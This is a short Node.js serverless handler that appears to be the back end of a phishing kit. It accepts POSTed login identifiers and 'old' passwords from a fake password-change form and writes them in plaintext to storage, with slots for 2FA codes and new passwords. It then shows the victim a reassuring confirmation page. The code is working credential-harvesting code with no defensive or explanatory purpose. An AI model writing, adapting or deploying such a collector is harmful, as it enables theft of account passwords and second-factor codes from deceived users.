const querystring = require('querystring');
const { confirmationHtml, applyNoCache } = require('./_html');
const { addEntry } = require('./_storage');

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => { data += chunk.toString(); if (data.length > 1e6) reject(new Error('Body too large')); });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function parseBody(raw, contentType) {
  if (!raw) return {};
  try {
    if (contentType && contentType.includes('application/json')) return JSON.parse(raw);
    return querystring.parse(raw);
  } catch { return {}; }
}

module.exports = async (req, res) => {
  applyNoCache(res);
  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.setHeader('Allow', 'POST');
    res.end('Method Not Allowed');
    return;
  }

  let body = {};
  try {
    const raw = await readBody(req);
    body = parseBody(raw, req.headers && req.headers['content-type']);
  } catch {}

  const entry = {
    timestamp: new Date().toLocaleString('fr-FR'),
    identifier: body.identifier || '',
    old_password: body.oldPassword || '',
    code_2fa: '',
    new_password: '',
    confirm_password: ''
  };

  try {
    await addEntry(entry);
  } catch (err) {
    console.warn('[submit] addEntry failed', err && err.message);
  }

  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.end(confirmationHtml);
};
